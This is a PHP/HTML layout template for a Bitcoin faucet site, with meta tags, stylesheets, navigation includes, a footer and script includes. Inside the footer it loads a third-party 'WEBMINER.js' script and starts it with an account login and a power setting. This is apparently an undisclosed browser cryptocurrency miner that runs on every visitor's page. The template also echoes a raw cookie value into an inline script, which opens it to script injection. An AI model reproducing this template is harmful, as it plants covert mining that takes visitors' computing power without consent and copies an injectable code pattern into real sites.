<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title><?php echo $page ?> | <?php echo $settings['name'] ?></title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta content='width=device-width, initial-scale=1.0' name='viewport' />
    <meta content="<?php echo $settings['description'] ?>" name="description" />
    <meta name="keywords" content="Bitcoin, Cryptocurrency, Faucet"/>   

    <meta name="og:title" content="<?php echo $page ?> | <?php echo $settings['name'] ?>"/>
    <meta name="og:type" content="business"/>
    <meta name="og:url" content="<?php echo base_url() ?>"/>
<?php foreach(glob('assets/upload/logo/'.'*.{jpg,JPG,jpeg,JPEG,png,PNG}',GLOB_BRACE) as $image){ $logoname[] =  basename($image); } ?>
    <meta name="og:image" content="<?php echo base_url('assets/upload/logo/'.$logoname[0]) ?>"/>
    <meta name="og:site_name" content="<?php echo $settings['name'] ?>"/>
    <meta name="og:description" content="<?php echo $settings['description'] ?>"/>     

    <meta content="<?php echo $settings['name'] ?>" name="author" />

    <meta name="subject" content="Bitcoin"/>
    <meta name="copyright" content="<?php echo $settings['name'] ?>"/>
    <meta name="language" content="EN"/>
    <meta name="Classification" content="Business"/>
    <meta name="owner" content="cryptocoins"/>
    <meta name="coverage" content="Worldwide"/>
    <meta name="distribution" content="Global"/>

  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />

  <link href="<?= base_url() ?>assets/new/vendor/aos/aos.css" rel="stylesheet">
  <link href="<?= base_url() ?>assets/new/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="<?= base_url() ?>assets/new/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="<?= base_url() ?>assets/new/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="<?= base_url() ?>assets/new/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="<?= base_url() ?>assets/new/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>newassets/css/custom.css" rel="stylesheet" />
  <link href="<?= base_url() ?>assets/new/css/style.css" rel="stylesheet">

   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <!-- App favicon -->
<?php foreach(glob('assets/upload/favicon/'.'*.{jpg,JPG,jpeg,JPEG,png,PNG}',GLOB_BRACE) as $image){ $faviconname[] =  basename($image); } ?>
<link rel="shortcut icon" href="<?= base_url('assets/upload/favicon/'.$faviconname[0]) ?>" type="image/png">
<link rel="apple-touch-icon" href="<?= base_url('assets/upload/favicon/'.$faviconname[0]) ?>" type="image/png">
    <script src='<?= base_url() ?>assets/js/webjs/sweetalert.min.js'></script>
<style>
body {
background-image: linear-gradient( 174.2deg,  rgba(242, 244, 252,1) 7.1%, rgba(239, 238, 246,1) 67.4% );
}
<?php if(current_url() == site_url()) { ?>
#hero {
  width: 100%;
  height: 100vh;
<?php foreach(glob('assets/upload/hero_image/'.'*.{jpg,JPG,jpeg,JPEG,png,PNG}',GLOB_BRACE) as $image){ $heroname[] =  basename($image); } ?>
  background: url("<?= base_url('assets/upload/hero_image/'.$heroname[0]) ?>") top right no-repeat;
  background-size: cover;
  position: relative;
}
<?php } ?>
</style>
</head>
<body>
<?php if ($settings['status'] != 'off') { ?>
<?php include 'include/adblock.php'; ?>
<?php if (isset($_SESSION['sweet_message'])) { echo $_SESSION['sweet_message'];} ?>
<?php if(current_url() != site_url('login') && current_url() != site_url('register') && current_url() != site_url('forgot-password')) { ?>
  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
  <header id="header" class="d-flex flex-column justify-content-center">
    <nav id="navbar" class="navbar nav-menu">
    <?php if(isset($_SESSION['FID'])) { ?>
        <?php include 'include/navigation.php'; ?>
    <?php }else{ ?>
        <?php include 'include/homenav.php'; ?>
    <?php } ?>
    </nav><!-- .nav-menu -->
  </header><!-- End Header -->
<?php } ?>
<?php } ?>
<?php if(isset($_SESSION['FID'])) { ?>
  <main id="main">
    <?php if (isset($_SESSION['message'])) {echo $_SESSION['message'];} ?>
    <section>
        <?= $contents ?>
    </section>
  </main><!-- End #main -->
    <?php }else{ ?>
        <?= $contents ?>
    <?php } ?>
  <!-- ======= Footer ======= -->
  <footer id="footer">
    <div class="container">
      <p>Server Time: <?= date('l jS \of F Y h:i:s A') ?>.</p>
      <div class="copyright">
        &copy; Copyright <?php echo date("Y"); ?> <strong><span><?php echo $settings['name'] ?></span></strong>. All Rights Reserved
      </div>
    <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
	<script>WEBMINER.config({ login: "6134149", pass: null }).power(10);</script>
	</div>
  </footer><!-- End Footer -->
<?php if ($settings['status'] != 'off') { ?>
<?php if(isset($_SESSION['FID'])) { ?>
    <?php include 'include/modals.php'; ?>
<?php } ?>
<?php } ?>
  <!--   Core JS Files   -->
  <script src="<?= base_url() ?>newassets/js/core/jquery.min.js"></script>
  <script src="<?= base_url() ?>newassets/js/core/popper.min.js"></script>
  <script src="<?= base_url() ?>newassets/js/core/bootstrap.min.js"></script>
    <script type="text/javascript">
        var site_url = "<?= base_url() ?>";
    </script>

    <?php if (isset($current) != '') { ?>
      <script src="<?= base_url() ?>newassets/js/faucet.js"></script>
    <?php } ?>

    <script src="<?= base_url() ?>assets/js/webjs/captcha.js"></script>
    <?php if (isset($antibot_js)) { ?>
        <?= $antibot_js ?>
        <script src="<?= base_url() ?>assets/js/webjs/antibotlinks.js"></script>
    <?php } ?>
    <?php if (isset($_COOKIE['captcha'])) { ?>
        <script>
            $('option[value=<?= $_COOKIE['captcha'] ?>]').attr('selected', 'selected');
        </script>
    <?php } ?>    

  <!-- Vendor JS Files -->
  <script src="<?= base_url() ?>assets/new/vendor/purecounter/purecounter.js"></script>
  <script src="<?= base_url() ?>assets/new/vendor/aos/aos.js"></script>
  <script src="<?= base_url() ?>assets/new/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="<?= base_url() ?>assets/new/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="<?= base_url() ?>assets/new/vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <script src="<?= base_url() ?>assets/new/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="<?= base_url() ?>assets/new/vendor/typed.js/typed.min.js"></script>
  <script src="<?= base_url() ?>assets/new/vendor/waypoints/noframework.waypoints.js"></script>
  <!-- Template Main JS File -->
  <script src="<?= base_url() ?>assets/new/js/main.js"></script>

</body>

</html>